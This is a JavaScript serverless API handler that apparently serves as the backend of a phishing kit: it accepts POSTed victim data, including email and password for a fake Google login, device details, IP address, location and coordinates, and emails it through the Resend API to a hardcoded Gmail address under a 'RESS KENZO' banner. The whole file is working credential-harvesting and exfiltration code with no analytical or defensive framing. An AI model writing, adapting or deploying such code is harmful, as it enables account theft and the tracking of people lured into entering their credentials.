export const config = {
    api: {
        bodyParser: true
    }
};

function countryFlag(code){
    if (!code || code.length !== 2) return "";
    const codePoints = code.toUpperCase().split("").map(function(c){
        return 127397 + c.charCodeAt(0);
    });
    return String.fromCodePoint.apply(null, codePoints);
}

export default async function handler(req, res) {

    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") {
        return res.status(200).end();
    }

    if (req.method !== "POST") {
        return res.status(405).json({ error: "Method not allowed" });
    }

    const API_KEY = process.env.RESEND_API_KEY;

    if (!API_KEY) {
        return res.status(500).json({
            error: "API_KEY_MISSING",
            message: "RESEND_API_KEY env variable not set"
        });
    }

    try {

        let d = req.body;
        if (typeof d === "string") {
            d = JSON.parse(d);
        }
        if (!d) {
            return res.status(400).json({ error: "BODY_EMPTY" });
        }

        const NAMA  = process.env.RESS_NAME  || "RESS KENZO";
        const EMAIL = process.env.RESS_EMAIL || "medikaputra5@gmail.com";

        const flag = countryFlag(d.negaraKode || "");

        const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");

        const htmlBody = `
<div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">
  ${previewText}
</div>
<div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
  <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
    <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
      <h1 style="margin:0;font-size:22px">🥷 ${NAMA} 🥷</h1>
    </div>
    <div style="padding:25px">
      <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
      <table style="width:100%;font-size:14px;border-collapse:collapse">
        <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">LOGIN</td><td style="padding:10px">Google</td></tr>
      </table>

      <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📱 DEVICE INFO</h3>
      <table style="width:100%;font-size:14px;border-collapse:collapse">
        <tr><td style="padding:10px;font-weight:bold;width:35%">DEVICE</td><td style="padding:10px">${d.device || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">OS VERSION</td><td style="padding:10px">${d.os || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">BROWSER</td><td style="padding:10px">${d.browser || "-"}</td></tr>
      </table>

      <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
      <table style="width:100%;font-size:14px;border-collapse:collapse">
        <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">IPV6</td><td style="padding:10px">${d.ipv6 || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${flag} ${d.negara || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PROPINSI</td><td style="padding:10px">${d.prov || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ZONA WAKTU</td><td style="padding:10px">${d.zona || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">PROVIDER</td><td style="padding:10px">${d.isp || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ASN</td><td style="padding:10px">${d.asn || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">ZIP CODE</td><td style="padding:10px">${d.zip || "-"}</td></tr>
        <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">LAT , LONG</td><td style="padding:10px">${d.koord || "-"}</td></tr>
        <tr><td style="padding:10px;font-weight:bold">JAM MASUK</td><td style="padding:10px">${d.waktu || "-"}</td></tr>
      </table>
    </div>
    <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">
      ${NAMA} - Real Data Stream
    </div>
  </div>
</div>`;

        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: {
                "Authorization": "Bearer " + API_KEY,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                from: NAMA + " <onboarding@resend.dev>",
                to: [EMAIL],
                subject: "🥷 " + NAMA + " 🥷 - " + Date.now(),
                html: htmlBody
            })
        });

        const data = await response.json();

        return res.status(response.status).json(data);

    } catch (error) {
        return res.status(500).json({
            error: "CATCH_ERROR",
            message: error.message,
            stack: error.stack
        });
    }
}
